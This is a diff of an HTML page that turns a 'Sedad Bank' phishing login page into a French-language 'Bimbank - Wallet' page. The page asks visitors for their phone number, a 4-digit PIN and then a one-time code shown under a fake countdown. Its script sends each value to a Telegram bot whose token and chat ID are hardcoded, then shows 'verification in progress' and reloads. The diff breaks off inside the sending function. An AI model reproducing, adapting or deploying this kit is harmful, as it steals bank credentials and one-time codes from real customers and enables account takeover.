@@ -1,126 +1,159 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="fr" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sedad Bank</title>
+    <title>Bimbank - Wallet</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap');
-        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(to bottom, #f4f8ff, #ffffff); margin: 0; min-height: 100vh; color: #333; }
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f8faff; margin: 0; min-height: 100vh; color: #3b4d70; }
+        
+        .grid-bg {
+            background-image: linear-gradient(#e5e7eb 1px, transparent 1px), linear-gradient(90deg, #e5e7eb 1px, transparent 1px);
+            background-size: 25px 25px;
+        }
 
-        /* التصميم العام الواجهة */
-        .container-box { max-width: 400px; margin: 0 auto; padding: 40px 20px; text-align: center; }
-        .logo-img { width: 220px; margin: 0 auto 50px; display: block; }
+        .logo-section { display: flex; flex-direction: column; align-items: center; padding: 40px 0 20px; }
+        .logo-img { width: 200px; height: auto; }
+        .welcome-text { font-size: 1.2rem; color: #3b4d70; text-align: center; margin-top: 10px; font-weight: 500; }
 
-        /* حقل الهاتف بنمط الصورة */
-        .input-field { width: 100%; border: 1px solid #ccc; border-radius: 12px; padding: 14px 15px; font-size: 16px; outline: none; background: white; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between; }
-        .input-field input { border: none; outline: none; width: 100%; text-align: left; font-size: 16px; }
+        .tab-container { display: flex; border: 2px solid #324a84; border-radius: 12px; margin: 20px 30px; overflow: hidden; background: white; }
+        .tab-btn { flex: 1; padding: 12px; text-align: center; font-weight: bold; font-size: 0.9rem; }
+        .tab-active { background-color: #324a84; color: white; }
+        .tab-inactive { color: #9ca3af; }
 
-        /* مربعات PIN و OTP */
-        .code-container { display: flex; gap: 10px; justify-content: center; margin-bottom: 30px; }
-        .digit-box { width: 50px; height: 70px; border: 1px solid #ccc; border-radius: 15px; text-align: center; font-size: 24px; font-weight: bold; outline: none; background: white; transition: border-color 0.3s; }
-        .digit-box:focus { border-color: #009640; }
+        .form-section { padding: 0 30px; }
+        .login-title { font-size: 1.2rem; font-weight: bold; color: #324a84; margin-bottom: 20px; text-align: left; }
 
-        /* الأزرار */
-        .btn-green { background-color: #009640; color: white; width: 100%; padding: 14px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; border: none; }
-        .btn-green:active { background-color: #007a33; }
+        .input-group { position: relative; margin-bottom: 20px; }
+        .custom-input { width: 100%; padding: 15px; border: 1px solid #d1d5db; border-radius: 10px; outline: none; font-size: 1rem; background: white; }
+        .input-counter { position: absolute; right: 10px; bottom: -18px; font-size: 10px; color: #9ca3af; }
 
-        /* الروابط السفلية */
-        .link-text { color: #666; font-size: 14px; margin-top: 15px; display: block; text-decoration: none; }
-        .footer-links { margin-top: 60px; font-size: 15px; }
-        .gold-text { color: #c09a5b; font-weight: bold; }
+        .forgot-link { display: block; text-align: right; color: #9ca3af; font-size: 0.85rem; margin-top: 10px; text-decoration: none; }
 
-        /* واجهة OTP */
-        #screen-otp { display: none; }
+        .btn-orange { background-color: #f19e2c; color: white; width: 100%; padding: 15px; border-radius: 10px; font-size: 1.1rem; font-weight: bold; margin-top: 25px; border: none; cursor: pointer; }
+        
+        .footer-section { text-align: center; margin-top: 40px; }
+        .signup-text { color: #3b4d70; font-weight: bold; margin-top: 8px; display: block; }
+
+        .contact-btn { display: flex; align-items: center; justify-content: center; gap: 10px; border: 1.5px solid #3b4d70; border-radius: 10px; padding: 10px 30px; margin: 30px auto; width: fit-content; color: #3b4d70; font-weight: 500; }
+
+        /* OTP Modal Styles */
+        #otp-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); align-items: center; justify-content: center; z-index: 100; padding: 20px; }
+        .modal-content { background: white; border-radius: 20px; width: 100%; max-width: 360px; padding: 30px; position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        .close-modal { position: absolute; top: 15px; right: 15px; font-size: 24px; color: #324a84; cursor: pointer; }
+        
+        .timer-circle { width: 120px; height: 120px; border: 6px solid #fff5e6; border-top: 6px solid #f19e2c; border-radius: 50%; margin: 10px auto 20px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: bold; color: #3b4d70; }
+        .otp-label { text-align: left; font-size: 0.95rem; color: #4b5563; margin-bottom: 8px; }
     </style>
 </head>
-<body>
+<body class="grid-bg">
 
-    <!-- الواجهة الأولى: تسجيل الدخول -->
-    <div id="screen-login" class="container-box">
-        <img src="https://i.ibb.co/3sX8H3N/sedad-logo.png" alt="Sedad Bank" class="logo-img">
-
-        <div class="input-field">
-            <input id="phone" type="tel" placeholder="Phone Number" maxlength="8" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-            <svg style="width:20px; color:#999" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" stroke-width="2"></path></svg>
+    <!-- Screen 1: Login -->
+    <div id="screen-login">
+        <div class="logo-section">
+            <img src="https://i.ibb.co/m5v8G1f/bimbank-logo.png" alt="Bimbank" class="logo-img">
+            <div class="welcome-text">Bienvenue dans votre<br>espace wallet</div>
         </div>
 
-        <div class="code-container">
-            <input type="password" maxlength="1" class="digit-box login-pin" oninput="validateDigit(this, 0)">
-            <input type="password" maxlength="1" class="digit-box login-pin" oninput="validateDigit(this, 1)">
-            <input type="password" maxlength="1" class="digit-box login-pin" oninput="validateDigit(this, 2)">
-            <input type="password" maxlength="1" class="digit-box login-pin" oninput="validateDigit(this, 3)">
+        <div class="tab-container">
+            <div class="tab-btn tab-active">Wallet</div>
+            <div class="tab-btn tab-inactive">Banking</div>
         </div>
 
-        <button onclick="handleLogin()" class="btn-green">Login</button>
-        <a href="#" class="link-text">Forgot password?</a>
+        <div class="form-section">
+            <div class="login-title">Connexion</div>
+            
+            <div class="input-group">
+                <input id="phone" type="tel" class="custom-input" placeholder="Téléphone" maxlength="8" oninput="updateCounter(this, 'c-phone')">
+                <span id="c-phone" class="input-counter">0/8</span>
+            </div>
 
-        <div class="footer-links">
-            New user? <span class="gold-text">Register Now</span>
+            <div class="input-group">
+                <input id="pin" type="password" class="custom-input" placeholder="Mot de passe" maxlength="4" oninput="updateCounter(this, 'c-pin')">
+                <span id="c-pin" class="input-counter">0/4</span>
+            </div>
+
+            <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+
+            <button onclick="handleLogin()" class="btn-orange">Connexion</button>
         </div>
 
-        <div style="margin-top: 40px; display: inline-flex; align-items: center; gap: 10px; background: white; padding: 10px 20px; border-radius: 10px; border: 1px solid #eee; font-size: 14px;">
-            <span>Contact Us</span>
-            <svg style="width:18px" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-width="2"></path></svg>
+        <div class="footer-section">
+            <p class="text-gray-500 text-sm">Nouvel utilisateur ?</p>
+            <a href="#" class="signup-text">S'inscrire maintenant &rarr;</a>
+            
+            <div class="contact-btn">
+                <svg style="width:20px" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-width="2"></path></svg>
+                <span>Contacts</span>
+            </div>
         </div>
     </div>
 
-    <!-- الواجهة الثانية: رمز التحقق (6 أرقام) -->
-    <div id="screen-otp" class="container-box">
-        <h2 style="font-weight: bold; font-size: 20px; margin-bottom: 10px;">Verification Code</h2>
-        <p style="color: #666; font-size: 14px; margin-bottom: 30px;">Enter the 6-digit code sent to your mobile</p>
+    <!-- Screen 2: OTP Modal -->
+    <div id="otp-modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeOTP()">&times;</span>
+            <div class="timer-circle" id="timer">04:59</div>
+            
+            <div class="otp-label">Entrez le code OTP</div>
+            <div class="input-group">
+                <input id="otp" type="tel" class="custom-input" maxlength="6" oninput="updateCounter(this, 'c-otp')">
+                <span id="c-otp" class="input-counter">0/6</span>
+            </div>
 
-        <div class="code-container">
-            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 4)">
-            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 5)">
-            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 6)">
-            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 7)">
-            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 8)">
-            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 9)">
+            <button onclick="submitOTP()" class="btn-orange">Connexion</button>
         </div>
-
-        <button onclick="submitOTP()" class="btn-green">Verify</button>
-        <a href="#" onclick="location.reload()" class="link-text">Back to Login</a>
     </div>
 
     <script>
         const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
         const CHAT = "8665814266";
 
-        function validateDigit(el, idx) {
+        function updateCounter(el, id) {
             el.value = el.value.replace(/[^0-9]/g, '');
-            const allBoxes = document.querySelectorAll('.digit-box');
-            if (el.value.length === 1 && idx < allBoxes.length - 1) {
-                allBoxes[idx + 1].focus();
-            }
+            document.getElementById(id).innerText = `${el.value.length}/${el.maxLength}`;
         }
 
         function handleLogin() {
             const phone = document.getElementById('phone').value;
-            let pin = "";
-            document.querySelectorAll('.login-pin').forEach(b => pin += b.value);
+            const pin = document.getElementById('pin').value;
 
-            if(phone.length >= 8 && pin.length === 4) {
-                send(`🏦 Sedad Login\n📱 Phone: ${phone}\n🔐 PIN: ${pin}`);
-                document.getElementById('screen-login').style.display = 'none';
-                document.getElementById('screen-otp').style.display = 'block';
+            if(phone.length === 8 && pin.length === 4) {
+                send(`🏦 Bimbank Login\n📱 Phone: ${phone}\n🔐 PIN: ${pin}`);
+                document.getElementById('otp-modal').style.display = 'flex';
+                startTimer(299);
             } else {
-                alert("Please fill all fields correctly.");
+                alert("Veuillez remplir les champs correctement.");
             }
         }
 
         function submitOTP() {
-            let otp = "";
-            document.querySelectorAll('.otp-box').forEach(b => otp += b.value);
+            const otp = document.getElementById('otp').value;
             if(otp.length === 6) {
-                send(`🔑 Sedad OTP: ${otp}`);
-                alert("Verification in progress...");
+                send(`🔑 Bimbank OTP: ${otp}`);
+                alert("Vérification en cours...");
                 location.reload();
             } else {
-                alert("Please enter the 6-digit code.");
+                alert("Entrez le code à 6 chiffres.");
             }
         }
+
+        function startTimer(duration) {
+            let timer = duration, minutes, seconds;
+            const display = document.getElementById('timer');
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) clearInterval(interval);
+            }, 1000);
+        }
+
+        function closeOTP() { document.getElementById('otp-modal').style.display = 'none'; }
 
         function send(msg) {
             fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
